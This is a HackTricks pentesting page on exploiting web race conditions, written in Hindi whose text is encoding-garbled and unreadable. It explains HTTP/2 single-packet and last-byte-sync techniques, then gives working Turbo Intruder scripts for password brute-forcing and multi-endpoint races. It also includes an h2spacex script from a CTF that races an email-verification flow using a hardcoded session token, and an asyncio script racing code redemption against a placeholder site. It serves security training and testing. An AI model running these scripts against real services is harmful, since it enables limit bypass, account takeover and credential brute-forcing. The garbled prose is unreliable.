# рд░реЗрд╕ рдХрдВрдбреАрд╢рди

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рдСрдЯреЛрдореЗрдЯ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

{% hint style="warning" %}
рдЗрд╕ рддрдХрдиреАрдХ рдХреЛ рдЧрд╣рд░реА рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
{% endhint %}

## рд░реЗрд╕ рдХрдВрдбреАрд╢рди рд╣рдорд▓реЗ рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдирд╛

рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреА рдореБрдЦреНрдп рдмрд╛рдзрд╛ рдпрд╣ рд╣реИ рдХрд┐ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП рдХрд┐ рдХрдИ рдЕрдиреБрд░реЛрдз рд╕рдордп рдкрд░ рд╕рдВрднрд╛рд▓реЗ рдЬрд╛рддреЗ рд╣реИрдВ, рдЙрдирдХреЗ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рд╕рдордп рдореЗрдВ **рдмрд╣реБрдд рдХрдо рдЕрдВрддрд░ рд╣реЛтАФрдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ, 1ms рд╕реЗ рдХрдо**ред

рдпрд╣рд╛рдБ рдЖрдкрдХреЛ рд╕рдордХрд╛рд▓рд┐рдХ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рд▓рд┐рдП рдХреБрдЫ рддрдХрдиреАрдХ рдорд┐рд▓реЗрдЧреА:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

* **HTTP/2**: рдПрдХ рд╣реА TCP рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рджреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдиреЗ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ, рдиреЗрдЯрд╡рд░реНрдХ рдЬрд┐рдЯрд░ рдкреНрд░рднрд╛рд╡ рдХреЛ рдХрдо рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╡рд┐рд╡рд┐рдзрддрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг, рджреЛ рдЕрдиреБрд░реЛрдз рдПрдХ рд╕реНрдерд┐рд░ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛ рд╕рдХрддреЗред
* **HTTP/1.1 'Last-Byte Sync'**: 20-30 рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдЕрдзрд┐рдХрд╛рдВрд╢ рд╣рд┐рд╕реНрд╕реЗ рдХреЛ рдкреВрд░реНрд╡-рднреЗрдЬрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдПрдХ рдЫреЛрдЯрд╛ рдЯреБрдХрдбрд╝рд╛ рд░реЛрдХрддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдлрд┐рд░ рд╕рд╛рде рдореЗрдВ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд░реНрд╡рд░ рдкрд░ рд╕рдордХрд╛рд▓рд┐рдХ рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

**Last-Byte Sync рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░реА** рд╢рд╛рдорд┐рд▓ рд╣реИ:

1. рд╕реНрдЯреНрд░реАрдо рд╕рдорд╛рдкреНрдд рдХрд┐рдП рдмрд┐рдирд╛ рд╣реЗрдбрд░ рдФрд░ рдмреЙрдбреА рдбреЗрдЯрд╛ рднреЗрдЬрдирд╛ред
2. рдкреНрд░рд╛рд░рдВрднрд┐рдХ рднреЗрдЬрди рдХреЗ рдмрд╛рдж 100ms рдХреЗ рд▓рд┐рдП рдард╣рд░рд╛рд╡ред
3. рдЕрдВрддрд┐рдо рдлреНрд░реЗрдо рдХреЗ рдмреИрдЪрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП Nagle's рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП TCP\_NODELAY рдХреЛ рдЕрдХреНрд╖рдо рдХрд░рдирд╛ред
4. рдХрдиреЗрдХреНрд╢рди рдХреЛ рдЧрд░реНрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд┐рдВрдЧ рдХрд░рдирд╛ред

рдмрд╛рдзрд┐рдд рдлреНрд░реЗрдореНрд╕ рдХреЗ рдЙрд╕рдХреЗ рднреЗрдЬрдиреЗ рдХреЗ рдмрд╛рдж рдЙрдирдХреА рдПрдХрд▓ рдкреИрдХреЗрдЯ рдореЗрдВ рдкрд╣реБрдВрдЪрдирд╛ рдЪрд╛рд╣рд┐рдП, рдЬрд┐рд╕реЗ Wireshark рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рдзрд┐ рд╕рд╛рдорд╛рдиреНрдпрдд: рдЖрд░рд╕реА рд╣рдорд▓реЛрдВ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдерд┐рд░ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

### рд╕рд░реНрд╡рд░ рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рдХреЛ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд░рдирд╛

рд▓рдХреНрд╖реНрдп рдХреА рд╡рд╛рд╕реНрддреБрдХрд▓рд╛ рдХреЛ рд╕рдордЭрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИред рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рд░реНрд╡рд░ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╡рд┐рднрд┐рдиреНрди рд░реВрдк рдореЗрдВ рд░реВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рд╕рдордп рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред рдЕрд░реНрдерд╣реАрди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреВрд░реНрд╡рд╛рдиреБрдорд╛рдирд┐рдд рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдХрдиреЗрдХреНрд╢рди рдЧрд░реНрдо рдХрд░рдирд╛, рдЕрдиреБрд░реЛрдз рд╕рдордп рдХреЛ рд╕рд╛рдорд╛рдиреНрдп рдХрд░ рд╕рдХрддрд╛ рд╣реИред

#### рд╕рддреНрд░-рдЖрдзрд╛рд░рд┐рдд рд▓реЙрдХрд┐рдВрдЧ рдХрд╛ рд╕рдВрднрд╛рд▓рди

PHP рдХреА рд╕рддреНрд░ рд╣реИрдВрдбрд▓рд░ рдЬреИрд╕реЗ рдлрд╝реНрд░реЗрдорд╡рд░реНрдХ рд╕рддреНрд░ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдЧреЛрдкрдиреАрдпрддрд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ рдЫрд┐рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдкреНрд░рддреНрдпреЗрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рд╕рддреНрд░ рдЯреЛрдХрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдЗрд╕ рд╕рдорд╕реНрдпрд╛ рдХреЛ рдЯрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред

#### рджрд░ рдпрд╛ рд╕рдВрд╕рд╛рдзрди рд╕реАрдорд╛рдПрдВ рдкрд╛рд░ рдХрд░рдирд╛

рдпрджрд┐ рдХрдиреЗрдХреНрд╢рди рдЧрд░реНрдо рдХрд░рдирд╛ рдЕрд╕рдлрд▓ рд╣реИ, рддреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреА рджрд░ рдпрд╛ рд╕рдВрд╕рд╛рдзрди рд╕реАрдорд╛рдПрдВ рдЬрд╛рдирдмреВрдЭрдХрд░ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдирд╛, рдбрдореА рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдмрд╛рдврд╝ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХрд▓ рдкреИрдХреЗрдЯ рд╣рдорд▓реЗ рдХреЛ рд╕реБрд╡рд┐рдзрд╛рдЬрдирдХ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рд╣рд╛рдпрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рд░реЗрд╕ рдХрдВрдбреАрд╢рди рдХреЗ рд▓рд┐рдП рдЙрддреНрддреЗрдЬрдХ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рджреЗрд░реА рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

## рд╣рдорд▓реЗ рдХреЗ рдЙрджрд╛рд╣рд░рдг

* **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: рдЖрдк **Turbo intruder** рдореЗрдВ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), рдЖрдк рдЬрд┐рд╕реЗ рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдЙрд╕рдХреЗ рд▓рд┐рдП рдЕрдиреБрд░реЛрдз рдореЗрдВ **`%s`** рдЬреИрд╕реЗ рдХреА `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` рдЬреИрд╕реЗ рд╡реИрд▓реНрдпреВ рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдбреНрд░реЙрдк рдбрд╛рдЙрди рд╕реЗ **`examples/race-single-packer-attack.py`** рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

рдпрджрд┐ рдЖрдк **рд╡рд┐рднрд┐рдиреНрди рдорд╛рди** рднреЗрдЬрдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ, рддреЛ рдЖрдк рдХреЛрдб рдХреЛ рдЗрд╕ рд╡рд╛рд▓реЗ рд╕реЗ рдореЙрдбрд┐рдлрд╝рд╛рдИ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХреНрд▓рд┐рдкрдмреЛрд░реНрдб рд╕реЗ рдПрдХ рд╡рд░реНрдбрд▓рд┐рд╕реНрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
{% hint style="warning" %}
рдпрджрд┐ рд╡реЗрдм HTTP2 рдХрд╛ рд╕рдорд░реНрдерди рдирд╣реАрдВ рдХрд░рддрд╛ (рдХреЗрд╡рд▓ HTTP1.1), рддреЛ `Engine.BURP2` рдХреА рдмрдЬрд╛рдп `Engine.THREADED` рдпрд╛ `Engine.BURP` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред
{% endhint %}

* **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: рдпрджрд┐ рдЖрдкрдХреЛ RCE рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 1 рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЛ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЕрдиреНрдп рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдкрд░ рдПрдХрд╛рдзрд┐рдХ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ рднреЗрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ, рддреЛ рдЖрдк `race-single-packet-attack.py` рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрд░рд╣ рд╕реЗ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
* рдпрд╣ рднреА **рд░рд┐рдкреАрдЯрд░** рдореЗрдВ рдЙрдкрд▓рдмреНрдз рд╣реИ рдмрд░реНрдк рд╕реНрд╡реАрдЯ рдХреЗ рдирдП '**рд╕рдореВрд╣ рдХреЛ рдкреИрд░рд▓рд▓ рднреЗрдЬреЗрдВ**' рд╡рд┐рдХрд▓реНрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗред
* **рд▓рд┐рдорд┐рдЯ-рдУрд╡рд░рди** рдХреЗ рд▓рд┐рдП рдЖрдк рдмрд╕ **рд╕рдореВрд╣ рдореЗрдВ 50 рдмрд╛рд░ рдПрдХ рд╣реА рдЕрдиреБрд░реЛрдз рдЬреЛрдбрд╝ рд╕рдХрддреЗ** рд╣реИрдВред
* **рдХрдиреЗрдХреНрд╢рди рд╡рд╛рд░реНрдорд┐рдВрдЧ** рдХреЗ рд▓рд┐рдП, рдЖрдк **рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рдХреБрдЫ рдЧреИрд░ рд╕реНрдерд┐рд░ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд▓рд┐рдП** рд╕рдореВрд╣ рдХреА **рд╢реБрд░реБрдЖрдд** рдореЗрдВ рдХреБрдЫ **рдЕрдиреБрд░реЛрдз** рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред
* **рдПрдХ рдЕрдиреБрд░реЛрдз рд╕реЗ рджреВрд╕рд░реЗ рддрдХ рдкреНрд░реЛрд╕реЗрд╕рд┐рдВрдЧ рдХреЗ рдмреАрдЪ** рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ **рд╡рд┐рд▓рдВрдмрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк **рджреЛрдиреЛрдВ рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЗ рдмреАрдЪ рдЕрддрд┐рд░рд┐рдХреНрдд рдЕрдиреБрд░реЛрдз рдЬреЛрдбрд╝ рд╕рдХрддреЗ** рд╣реИрдВред
* **рдорд▓реНрдЯреА-рдПрдВрдбрдкреЙрдЗрдВрдЯ** рдЖрд░рд╕реА рдХреЗ рд▓рд┐рдП рдЖрдк **рдЫрд┐рдкреЗ рд╣реБрдП рд╕реНрдерд┐рддрд┐** рдХреЛ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **рдЕрдиреБрд░реЛрдз** рднреЗрдЬрдирд╛ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдЗрд╕рдХреЗ рдмрд╛рдж **50 рдЕрдиреБрд░реЛрдз** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдЫрд┐рдкреЗ рд╣реБрдП рд╕реНрдерд┐рддрд┐ рдХрд╛ рд╢реЛрд╖рдг** рдХрд░рддреЗ рд╣реИрдВред

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* **рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ**: рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдИрдореЗрд▓ рдХреЛ рдмрджрд▓рдирд╛ рд╣реИ рдЬрдм рддрдХ рдирдП рдИрдореЗрд▓ рдХрд╛ рд╕рддреНрдпрд╛рдкрди рдЯреЛрдХрди рдкрд┐рдЫрд▓реЗ рдИрдореЗрд▓ рдкрд░ рдкрд╣реБрдВрдЪрддрд╛ рдирд╣реАрдВ рд╣реИ (рдпрд╣ рдЗрд╕рд▓рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рдХреЛрдб рдореЗрдВ рдПрдХ рдЖрд░рд╕реА рджреЗрдЦрд╛ рдЧрдпрд╛ рдерд╛ рдЬрд╣рд╛рдВ рдИрдореЗрд▓ рдХреЛ рдореЛрдбрд┐рдлрд╛рдИ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ рд▓реЗрдХрд┐рди рд╕рддреНрдпрд╛рдкрди рдкреБрд░рд╛рдиреЗ рдИрдореЗрд▓ рдкрд░ рднреЗрдЬрд╛ рдЧрдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдИрдореЗрд▓ рдХреЛ рджрд░реНрд╢рд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╡реЗрд░рд┐рдПрдмрд▓ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдкреВрд░реНрдг рдерд╛)ред\
рдЬрдм рд╣рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдИрдореЗрд▓ рдореЗрдВ "рдЙрджреНрджреЗрд╢реНрдп" рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рд╣рдореЗрдВ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рд╣рдордиреЗ рдмрджрд▓реЗ рдЧрдП рдИрдореЗрд▓ рдХрд╛ рд╕рддреНрдпрд╛рдкрди рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рд╣реИ рдФрд░ рд╣рдо рд╣рдорд▓рд╛ рд╕рдорд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВред
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)




# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### рдХрдЪреНрдЪрд╛ рдмреАрдПрдл

рдкрд┐рдЫрд▓реЗ рдЕрдиреБрд╕рдВрдзрд╛рди рд╕реЗ рдкрд╣рд▓реЗ рдпреЗ рдХреБрдЫ payloads рдереЗ рдЬреЛ рдХреЗрд╡рд▓ рдПрдХ RC рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдЬрд┐рддрдиреА рдЬрд▓реНрджреА рд╕рдВрднрд╡ рд╣реЛ рднреЗрдЬрдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рдереЗред

* **Repeater:** рдкрд┐рдЫрд▓реЗ рдЦрдВрдб рд╕реЗ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦреЗрдВред
* **Intruder**: **Intruder** рдХреЛ **request** рднреЗрдЬреЗрдВ, **Options menu** рдореЗрдВ **number of threads** рдХреЛ **30** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ, **Null payloads** рдХреЛ payload рдХреЗ рд░реВрдк рдореЗрдВ рдЪреБрдиреЗрдВ рдФрд░ **30** рдЬрдирд░реЗрдЯ рдХрд░реЗрдВред
* **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
* **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### **рд╕реАрдорд╛-рдЕрддрд┐рд░рд┐рдХреНрдд / TOCTOU**

